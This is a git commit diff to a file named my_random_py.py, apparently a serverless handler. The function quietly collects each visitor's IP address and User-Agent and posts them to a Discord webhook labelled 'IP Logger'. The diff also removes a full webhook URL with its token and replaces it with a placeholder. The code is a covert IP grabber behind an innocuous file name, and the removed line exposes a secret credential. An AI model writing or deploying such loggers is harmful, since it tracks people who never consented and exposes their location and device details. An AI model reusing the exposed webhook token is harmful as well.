537ca1976e0f0c2976990e78d123ad16d43f68f4
Kagami Dev <PatrickGoolMan1300@proton.me>
2025-03-12 05:47:12 +0100

    Update my_random_py.py

--- api/my_random_py.py
+++ api/my_random_py.py
@@ -1,23 +1,19 @@
 import json
 import requests
 
-# Webhook Discord
-WEBHOOK_URL = "https://discord.com/api/webhooks/1338289805330485269/HWNiUL4_apZL2n3c9qJxxieUQiqKKOgsVROl3Lsgl9QcCwVoWsAcxy1ndbLKSnCrPoEw"
+WEBHOOK_URL = "WEBHOOK_URL"
 
 def handler(event, context):
     try:
-        # Récupérer l'IP et l'User-Agent
         headers = event.get('headers', {})
         client_ip = headers.get('x-forwarded-for', 'IP not found')
         user_agent = headers.get('user-agent', 'User-Agent not found')
 
-        # Envoyer les infos sur le webhook Discord
         requests.post(WEBHOOK_URL, json={
             "username": "IP Logger",
             "content": f"**Nouvelle IP détectée !**\n- **IP:** {client_ip}\n- **User-Agent:** {user_agent}"
         })
 
-        # Réponse HTTP pour l'utilisateur
         return {
             "statusCode": 200,
             "headers": {"Content-Type": "application/json"},
